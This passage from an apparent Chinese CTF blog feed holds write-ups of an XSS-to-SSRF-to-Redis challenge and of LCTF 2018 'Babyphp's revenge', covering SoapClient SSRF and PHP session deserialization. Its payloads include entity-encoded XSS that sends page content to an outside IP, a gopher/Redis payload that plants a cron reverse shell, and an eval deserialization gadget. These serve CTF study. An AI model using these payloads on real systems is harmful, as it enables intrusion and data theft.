class="line">&lt;svg/onload=&quot;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#100;&amp;#121;&amp;#102;&amp;#117;&amp;#99;&amp;#97;&amp;#46;&amp;#99;&amp;#101;&amp;#121;&amp;#101;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#63;&amp;#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#98;&amp;#111;&amp;#100;&amp;#121;&amp;#46;&amp;#105;&amp;#110;&amp;#110;&amp;#101;&amp;#114;&amp;#72;&amp;#84;&amp;#77;&amp;#76;&amp;#41&quot;&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/vl59gfcbdbqvpyix3gpr24dd/image_1d3av33fj166qnbd2a1k9l1dsl1t.png" alt="image_1d3av33fj166qnbd2a1k9l1dsl1t.png-48.4kB"></p><p>看源码看到一个<code>request.php</code>，让bot去访问一下，打一下html的源码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&apos;http://155.94.177.154:55555/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.send();</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><p>实体编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#61;&amp;#110;&amp;#101;&amp;#119;&amp;#32;&amp;#88;&amp;#77;&amp;#76;&amp;#72;&amp;#116;&amp;#116;&amp;#112;&amp;#82;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#40;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#110;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#99;&amp;#104;&amp;#97;&amp;#110;&amp;#103;&amp;#101;&amp;#61;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#10;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#105;&amp;#102;&amp;#32;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#83;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#61;&amp;#61;&amp;#52;&amp;#32;&amp;#38;&amp;#38;&amp;#32;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#117;&amp;#115;&amp;#61;&amp;#61;&amp;#50;&amp;#48;&amp;#48;&amp;#41;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#49;&amp;#53;&amp;#53;&amp;#46;&amp;#57;&amp;#52;&amp;#46;&amp;#49;&amp;#55;&amp;#55;&amp;#46;&amp;#49;&amp;#53;&amp;#52;&amp;#58;&amp;#53;&amp;#53;&amp;#53;&amp;#53;&amp;#53;&amp;#47;&amp;#63;&amp;#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#115;&amp;#112;&amp;#111;&amp;#110;&amp;#115;&amp;#101;&amp;#84;&amp;#101;&amp;#120;&amp;#116;&amp;#41;&amp;#59;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#125;&amp;#10;&amp;#125;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#40;&amp;#34;&amp;#71;&amp;#69;&amp;#84;&amp;#34;&amp;#44;&amp;#34;&amp;#114;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#46;&amp;#112;&amp;#104;&amp;#112;&amp;#34;&amp;#44;&amp;#116;&amp;#114;&amp;#117;&amp;#101;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#101;&amp;#110;&amp;#100;&amp;#40;&amp;#41;&amp;#59&quot;&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/dpqs4a4xkx5dnkacxukg2z0a/image_1d3b132ppm4pa3e12t41osmeqc2a.png" alt="image_1d3b132ppm4pa3e12t41osmeqc2a.png-351.3kB"><br>解码后：<br><img src="http://static.zybuluo.com/Passer6y/qkx65iso9cjujy9q75yr3meg/image_1d3b1849pspg1eht1kv690g69c2n.png" alt="image_1d3b1849pspg1eht1kv690g69c2n.png-43kB"></p><p>所以我们给request.php传入的post参数为<code>url=ip</code></p><p>结合robot.txt提示，读config.php。<br><img src="http://static.zybuluo.com/Passer6y/f8lqqvhsqbpze29r14xn90r3/image_1d3b1ce78i4ursl1gvvlli8j834.png" alt="image_1d3b1ce78i4ursl1gvvlli8j834.png-29.1kB"></p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&apos;http://155.94.177.154:55555/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=file:///var/www/html/config.php&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>编码后，打到<br><img src="http://static.zybuluo.com/Passer6y/qhqjoll25yorcusshkojm8ps/image_1d3b2e3pc1hbu1dg2fcv9j5biq3h.png" alt="image_1d3b2e3pc1hbu1dg2fcv9j5biq3h.png-57.6kB"></p><p>flag2:<code>FLAG{curl -v -o flag --next flag://in-the.redis/the?port=25566&amp;good=luck}</code></p><h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>提示我们打内网redis，redis协议使用的是简单的文本流。<br>比如下面发送的tcp流数据，每行代表一条命令，下面是两个<code>set</code>命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SET x 1</span><br><span class="line">SET y 2</span><br></pre></td></tr></table></figure></p><p>显然，如果是get型的ssrf他无法控制单独的一行(除非有crlf漏洞)，p神这篇文章提到了这个点：<a href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a></p><p>所以这里得用Gopher协议，可以以get形式发起post请求</p><p>用popherus生成了个弹shell的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://localhost:25566/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/155.94.177.154/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&apos;http://155.94.177.154:5555/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/155.94.177.154/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><p>但是弹不回来..</p><p>exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&apos;http://155.94.177.154:55556/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%252053%250a_quit&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/a3x5siapt9f32a80wxjjy39i/image_1d3basv6lemp4e91akeq2m11v03u.png" alt="image_1d3basv6lemp4e91akeq2m11v03u.png-35.8kB"></p><p>处理一下flag格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">file = open(&quot;flag.txt&quot;)</span><br><span class="line">tmp = []</span><br><span class="line">while 1:</span><br><span class="line">line = file.readline()</span><br><span class="line">tmp.append(line.replace(&quot;\n&quot;, &quot;&quot;))</span><br><span class="line">if not line:</span><br><span class="line">break</span><br><span class="line">pass</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(0, tmp.__len__())[::-1]:</span><br><span class="line">flag += tmp[i]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/fgcj5kjvcc91xyu97memme45/image_1d3bboftp1b9u1m0fpk91g2em174b.png" alt="image_1d3bboftp1b9u1m0fpk91g2em174b.png-224.8kB"></p><p>再附上处理验证码的脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import hashlib  </span><br><span class="line">strs = &apos;00000&apos;</span><br><span class="line">def md5(s):</span><br><span class="line">    return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    for i in range(100000,100000000):</span><br><span class="line">    tmp = &quot;3f81ef4c8455e281&quot;+str(i)</span><br><span class="line">        a = md5(tmp)</span><br><span class="line">        if a[0:5] == strs:</span><br><span class="line">            print(i)</span><br><span class="line">            exit(0)  </span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习了一下xss-&amp;gt;ssrf-&amp;gt;redis&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0day.design/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://0day.design/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>LCTF 2018 Babyphp&#39;s revenge</title>
    <link href="http://0day.design/2019/02/10/LCTF%202018%20Babyphp&#39;s%20revenge/"/>
    <id>http://0day.design/2019/02/10/LCTF 2018 Babyphp&#39;s revenge/</id>
    <published>2019-02-09T16:10:00.000Z</published>
    <updated>2019-02-11T11:50:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>继续填坑..<br><a id="more"></a></p><h3 id="一：-soap-ssrf"><a href="#一：-soap-ssrf" class="headerlink" title="一： soap ssrf"></a>一： soap ssrf</h3><ol><li><p>soap服务是什么？<br><img src="http://static.zybuluo.com/Passer6y/bfu9tthia4k90bvlfyakpwoa/image_1d368hpc812j6vgt12nnomj15ai9.png" alt="image_1d368hpc812j6vgt12nnomj15ai9.png-18.2kB"><br>简单而言即一种通信方式</p></li><li><p>特征<br>在phpinfo中可以看到<br><img src="http://static.zybuluo.com/Passer6y/jbrdrf23eic87pmw0eku7qqx/image_1d368p2le1ftg1u711senfq88rp16.png" alt="image_1d368p2le1ftg1u711senfq88rp16.png-74.5kB"></p></li><li><p>利用条件<br>有可控的点去反序列化调用soapclient类进行SSRF</p></li></ol><p>那么为什么要选择使用soapclient这个类呢？</p><ul><li>如果开启了soap服务，soapclient类就是php的内置类</li><li>从php文档中可以看到，其第一个参数为$Url，这就为之后的ssrf作为铺垫<br><img src="http://static.zybuluo.com/Passer6y/v2m6b0hriotdazaput1p459y/image_1d36apbldfe5t6k10k3j6skjg1j.png" alt="image_1d36apbldfe5t6k10k3j6skjg1j.png-12kB"></li><li>其次当数据被反序列化后，其对象还要调用一个不存在的类，以调用soapclient的__call方法</li></ul><blockquote><p>同时该类__call方法还有crlf注入漏洞，具体分析见：<a href="https://xz.aliyun.com/t/2148" target="_blank" rel="noopener">https://xz.aliyun.com/t/2148</a></p></blockquote><p>如何触发ssrf呢？<br>参考： </p><ul><li><a href="https://xz.aliyun.com/t/2148#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/2148#toc-0</a></li><li><a href="http://php.net/manual/zh/soapclient.soapclient.php" target="_blank" rel="noopener">http://php.net/manual/zh/soapclient.soapclient.php</a></li></ul><p>该类实例化的时候有两个参数：<br><img src="http://static.zybuluo.com/Passer6y/xuxs1zvq8enjdrecy8yu8iip/image_1d36c2pvtjn21por2trqvf1ffb20.png" alt="image_1d36c2pvtjn21por2trqvf1ffb20.png-35.3kB"><br>第一个参数控制是否为WSDL模式。如果为NULL，就是non-WSDL模式。<br>如果是非wsdl模式，反序列化的时候就会对options中的url进行远程soap请求。<br><img src="http://static.zybuluo.com/Passer6y/1ha4j8ki4elb8kqtn1ogn6g2/image_1d36c8d6mg6tsiq1k431k1d1uli2d.png" alt="image_1d36c8d6mg6tsiq1k431k1d1uli2d.png-106.3kB"><br>如果是wsdl模式，在序列化之前就会对$url参数进行请求，从而无法可控序列化数据。</p><p>本地复现：<br><img src="http://static.zybuluo.com/Passer6y/akjnfrhidbltnedbt1uh8yr5/image_1d36m8qmuoi6pft6tvgh1tug9.png" alt="image_1d36m8qmuoi6pft6tvgh1tug9.png-62.9kB"><br>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$location = &apos;http://155.94.177.154:6666/&apos;;</span><br><span class="line">$a = new SoapClient(null, array(&apos;location&apos; =&gt; $location ,&apos;uri&apos;  =&gt; &apos;123&apos;));</span><br><span class="line">$auth=  unserialize(serial1ize($a));</span><br><span class="line">$auth-&gt;aa();</span><br><span class="line">echo &quot;1&quot;;</span><br></pre></td></tr></table></figure></p><p>另一台vps上开启监听：<br><img src="http://static.zybuluo.com/Passer6y/j0ultsskxqj45scoto9i9fr8/image_1d36mb5vv9t5ctchmgmsn1e2tm.png" alt="image_1d36mb5vv9t5ctchmgmsn1e2tm.png-11.2kB"></p><p>执行：<br><img src="http://static.zybuluo.com/Passer6y/d535hyg4qv14nchcydmlyo4h/image_1d36md4p9npvjcs6psc92s0q1j.png" alt="image_1d36md4p9npvjcs6psc92s0q1j.png-13.2kB"></p><p>vps监听到：<br><img src="http://static.zybuluo.com/Passer6y/q8a8klv10qiu0zstoqowi9yf/image_1d36mdtlq1d2t9bgbhdbt25lu20.png" alt="image_1d36mdtlq1d2t9bgbhdbt25lu20.png-140.9kB"></p><p>可以看到在soap库发送的xml数据在数据包的post处，所以这个的局限在于一般只能打get形的ssrf。</p><p>后来在l3m0n师傅的博客上看到可以发post请求的思路：<a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a></p><p><img src="http://static.zybuluo.com/Passer6y/wkh2hbldh22t89ss9il4crnn/image_1d3dp2gq9rbt10s6hdj28p1kfa9.png" alt="image_1d3dp2gq9rbt10s6hdj28p1kfa9.png-186.9kB"></p><h3 id="二：php-session反序列化"><a href="#二：php-session反序列化" class="headerlink" title="二：php session反序列化"></a>二：php session反序列化</h3><p>其核心原理在于php在存储序列化$_SESSION数据引擎和反序列化该数据的引擎不一样导致。</p><p>利用条件：</p><ul><li><p>在同一网站能同时出现两种不同的session配置方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.serialize_handler=php_serialize|php</span><br></pre></td></tr></table></figure></li><li><p>$_SESSION值可控</p></li></ul><p>满足以上几点即等价于我们对unserialize()的参数可控。</p><p>php.ini中的配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=&quot;D:\xampp\tmp&quot;表明所有的session文件都是存储在xampp/tmp下</span><br><span class="line">session.save_handler=files  表明session是以文件的方式来进行存储的</span><br><span class="line">session.auto_start=0表明默认不启动session</span><br><span class="line">session.serialize_handler=php --定义用来序列化/反序列化的处理器名字。默认使用php</span><br></pre></td></tr></table></figure></p><p>session.serialize_handler的其他几种配置项：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</span><br><span class="line">php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line">php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</span><br></pre></td></tr></table></figure></p><p>使用<code>session.serialize_handler=php_serialize</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&quot;name&quot;] = &quot;PASSER6Y&quot;;</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/e7iqr1clgbmg82kqc7u8ryks/image_1d36r14f3m311ha2b8p1crh37m2d.png" alt="image_1d36r14f3m311ha2b8p1crh37m2d.png-83.1kB"><br>该方式在序列化数据前加了a:1:</p><p>而使用默认配置时(<code>session.serialize_handler=php</code>)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&quot;name&quot;] = &quot;PASSER6Y&quot;;</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/gjwxa7owf1zl1cku68yjc94v/image_1d36r4uf8c0718nj1igd1kmn1o352q.png" alt="image_1d36r4uf8c0718nj1igd1kmn1o352q.png-155.7kB"><br>php引擎将竖线(|)将其分割成两部分，前面为键名，后面为序列化数据</p><p>两者的差异在于用php方式时以<code>|</code>分割，如果我们在<code>php_serialize</code>存入的数据带有<code>|</code>，而取出数据时使用php引擎，则会导致序列化数据在经过php引擎时被反序列化引发安全问题。</p><p>漏洞复现demo：<br>1.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&quot;passer6y&quot;]=$_GET[&quot;a&quot;];</span><br></pre></td></tr></table></figure></p><p>2.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class aa &#123;</span><br><span class="line">    var $hi;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;hi = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">         eval($this-&gt;hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class aa &#123;</span><br><span class="line">    var $hi;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;hi = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">         eval($this-&gt;hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new aa();</span><br><span class="line"></span><br><span class="line">echo serialize($a);     //O:2:&quot;aa&quot;:1:&#123;s:2:&quot;hi&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br><span class="line">echo &quot;\n\n&quot;;</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure></p><p>payload: <code>http://ip/?a=|O:2:%22aa%22:1:{s:2:%22hi%22;s:10:%22phpinfo();%22;}</code></p><p>然后访问：2.php<br><img src="http://static.zybuluo.com/Passer6y/tmhm44j9p6xrzqwe5pjn9trz/image_1d36sp0n7ktotav1hi8pqtbo3k.png" alt="image_1d36sp0n7ktotav1hi8pqtbo3k.png-52.2kB"></p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>回到题目来看，分析一下题目逻辑；<br>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$b = &apos;implode&apos;;</span><br><span class="line">call_user_func($_GET[&apos;f&apos;],$_POST);</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_GET[&apos;name&apos;]))&#123;</span><br><span class="line">    $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);</span><br><span class="line">call_user_func($b,$a);</span><br></pre></td></tr></table></figure></p><p>flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">echo &apos;only localhost can get flag!&apos;;</span><br><span class="line">$flag = &apos;LCTF&#123;******************&#125;&apos;;</span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;</span><br><span 